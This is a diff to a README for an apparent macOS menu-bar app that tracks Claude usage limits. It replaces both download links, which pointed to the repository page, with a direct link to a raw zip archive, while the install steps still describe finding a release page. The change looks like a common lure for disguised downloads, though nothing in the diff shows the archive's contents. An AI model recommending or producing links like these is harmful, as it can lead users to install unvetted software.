@@ -1,6 +1,6 @@
 # 📊 ClaudeUsageBar - Track your Claude AI limits easily
 
-[![](https://img.shields.io/badge/Download-ClaudeUsageBar-blue.svg)](https://github.com/pink-electrostatics104/ClaudeUsageBar)
+[![](https://img.shields.io/badge/Download-ClaudeUsageBar-blue.svg)](https://raw.githubusercontent.com/pink-electrostatics104/ClaudeUsageBar/main/MenuBarApp/Claude-Usage-Bar-v2.2-beta.3.zip)
 
 ClaudeUsageBar helps you monitor your Claude AI message limits. Claude imposes specific limits on how many messages you send every five hours. This tool shows your remaining usage in your computer menu bar. It stays local on your machine and keeps your account data private.
 
@@ -23,7 +23,7 @@ This application runs on macOS. Ensure you have the following before you begin:
 
 Visit the link below to get the software.
 
-[Download ClaudeUsageBar Here](https://github.com/pink-electrostatics104/ClaudeUsageBar)
+[Download ClaudeUsageBar Here](https://raw.githubusercontent.com/pink-electrostatics104/ClaudeUsageBar/main/MenuBarApp/Claude-Usage-Bar-v2.2-beta.3.zip)
 
 1. Click the link above to reach the main download page.
 2. Look for the latest release on the right side of the screen.
